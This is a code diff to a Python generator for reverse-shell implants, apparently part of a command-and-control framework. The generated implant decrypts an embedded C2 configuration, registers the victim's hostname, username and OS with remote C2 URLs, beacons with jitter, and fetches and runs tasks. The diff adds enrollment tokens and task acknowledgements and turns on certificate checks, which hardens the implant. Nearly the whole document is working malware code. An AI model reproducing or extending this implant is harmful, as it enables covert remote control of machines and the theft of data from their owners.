@@ -1,5 +1,5 @@
 """
-OCTOPUS v11 — Python Reverse Shell Implant Generator.
+Python reverse-shell implant generator.
 
 Generates a self-contained Python implant with:
   - AES-GCM encrypted config (key split like Go implant)
@@ -26,7 +26,6 @@ import logging
 import os
 import secrets
 import textwrap
-from typing import List, Optional
 
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
@@ -74,10 +73,11 @@ def _split_key(key: bytes) -> tuple:
 
 
 def generate_python_implant(
-    c2_urls: List[str],
+    c2_urls: list[str],
     beacon_interval: int = 60,
     jitter_percent: int = 20,
     server_pub_b64: str = "",
+    enrollment_token: str = "",
 ) -> str:
     """Generate a complete Python reverse shell implant.
 
@@ -119,6 +119,27 @@ def generate_python_implant(
     if not 0 <= jitter_percent <= 50:
         raise ValueError(f"jitter_percent must be 0-50, got {jitter_percent}")
 
+    if not server_pub_b64:
+        from core.c2.builder import load_server_pub_key
+
+        base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(
+            os.path.abspath(__file__)
+        ))))
+        server_pub_b64 = load_server_pub_key(
+            os.path.join(base_dir, "data", "keys", "server_x25519_public.pem")
+        )
+    if len(base64.b64decode(server_pub_b64, validate=True)) != 32:
+        raise ValueError("server_pub_b64 must contain a raw 32-byte X25519 key")
+    if not enrollment_token:
+        from core.c2.enrollment import EnrollmentAuthority
+
+        base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(
+            os.path.abspath(__file__)
+        ))))
+        enrollment_token = EnrollmentAuthority(
+            os.path.join(base_dir, "data", "keys", "enrollment.key")
+        ).issue()
+
     # Generate encryption key and split it
     config_key = secrets.token_bytes(32)
     kp1, kp2 = _split_key(config_key)
@@ -126,7 +147,8 @@ def generate_python_implant(
     # Build config blob
     config = {
         "urls": ",".join(c2_urls),
-        "pub": server_pub_b64 or base64.b64encode(b"dummy_key_for_testing").decode(),
+        "pub": server_pub_b64,
+        "enrollment_token": enrollment_token,
     }
     enc_blob = _encrypt_config(config, config_key)
 
@@ -141,6 +163,7 @@ def generate_python_implant(
         import base64
         import hashlib
         import json
+        import logging
         import os
         import platform
         import random
@@ -169,6 +192,7 @@ def generate_python_implant(
         _rx_seq = 0
         _c2_urls = []
         _server_pub = b""
+        _enrollment_token = ""
         _self_path = ""
 
 
@@ -268,7 +292,7 @@ def generate_python_implant(
 
         def _init_config() -> bool:
             """Assemble split key, decrypt config, populate globals."""
-            global _c2_urls, _server_pub
+            global _c2_urls, _server_pub, _enrollment_token
             try:
                 hex_key = _KP1 + _KP2
                 key = bytes.fromhex(hex_key)
@@ -276,6 +300,9 @@ def generate_python_implant(
                 conf = json.loads(plaintext)
                 _c2_urls = conf["urls"].split(",")
                 _server_pub = base64.b64decode(conf.get("pub", ""))
+                _enrollment_token = conf.get("enrollment_token", "")
+                if len(_server_pub) != 32 or not _enrollment_token:
+                    return False
                 # Wipe plaintext
                 pt_mut = bytearray(plaintext)
                 for i in range(len(pt_mut)):
@@ -296,8 +323,6 @@ def generate_python_implant(
             from cryptography.hazmat.primitives.asymmetric import x25519
             from cryptography.hazmat.primitives import serialization
 
-            _agent_id = "AGT-" + str(int(time.time() * 1000))[-12:]
-
             # Generate ephemeral X25519 keypair
             priv_key = x25519.X25519PrivateKey.generate()
             pub_bytes = priv_key.public_key().public_bytes(
@@ -311,16 +336,14 @@ def generate_python_implant(
             )
 
             # Derive session key
-            if len(_server_pub) == 32:
-                _session_key = _derive_shared_key(priv_bytes, _server_pub)
-            else:
-                _session_key = os.urandom(32)
+            if len(_server_pub) != 32 or not _enrollment_token:
+                return False
+            _session_key = _derive_shared_key(priv_bytes, _server_pub)
 
             # Build registration data
             hostname = socket.gethostname()
             user = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))
             reg_data = json.dumps({{
-                "agent_id": _agent_id,
                 "hostname": hostname,
                 "os": platform.system(),
                 "user": user,
@@ -331,6 +354,7 @@ def generate_python_implant(
             payload = json.dumps({{
                 "client_pub": base64.b64encode(pub_bytes).decode(),
                 "data": enc_data,
+                "enrollment_token": _enrollment_token,
             }}).encode("utf-8")
 
             # Wipe private key
@@ -340,8 +364,6 @@ def generate_python_implant(
 
             # Try each C2 URL
             ctx = ssl.create_default_context()
-            ctx.check_hostname = False
-            ctx.verify_mode = ssl.CERT_NONE
 
             for url in _c2_urls:
                 try:
@@ -353,8 +375,13 @@ def generate_python_implant(
                     resp = urllib.request.urlopen(req, timeout=30, context=ctx)
                     resp_data = json.loads(resp.read())
                     if "data" in resp_data:
-                        _decrypt_aes_gcm(_session_key, resp_data["data"])
-                    return True
+                        registration = json.loads(
+                            _decrypt_aes_gcm(_session_key, resp_data["data"])
+                        )
+                        assigned_id = registration.get("agent_id", "")
+                        if assigned_id.startswith("AGT-"):
+                            _agent_id = assigned_id
+                            return True
                 except Exception as e:
                     continue
             return False
@@ -362,20 +389,19 @@ def generate_python_implant(
 
         # ─── Beacon Loop ──────────────────────────────────────────────
 
-        def _beacon(results: list = None) -> list:
+        def _beacon(results: list = None, acknowledgements: list = None) -> list:
             """Send beacon and receive tasks."""
             beacon_data = json.dumps({{
                 "agent_id": _agent_id,
                 "hostname": socket.gethostname(),
                 "results": results or [],
+                "acks": acknowledgements or [],
             }}).encode("utf-8")
 
             enc_data = _encrypt_aes_gcm(_session_key, beacon_data)
             payload = json.dumps({{"data": enc_data}}).encode("utf-8")
 
             ctx = ssl.create_default_context()
-            ctx.check_hostname = False
-            ctx.verify_mode = ssl.CERT_NONE
 
             for url in _c2_urls:
                 try:
@@ -541,6 +567,17 @@ def generate_python_implant(
                 try:
                     tasks = _beacon(pending_results)
                     pending_results = []
+                    if tasks:
+                        ack_ids = [
+                            task.get("task_id", "") for task in tasks
+                            if task.get("task_id")
+                        ]
+                        additional = _beacon([], ack_ids)
+                        known_ids = {{task.get("task_id") for task in tasks}}
+                        tasks.extend(
+                            task for task in additional
+                            if task.get("task_id") not in known_ids
+                        )
                     for task in tasks:
                         result = _process_task(task)
                         pending_results.append(result)
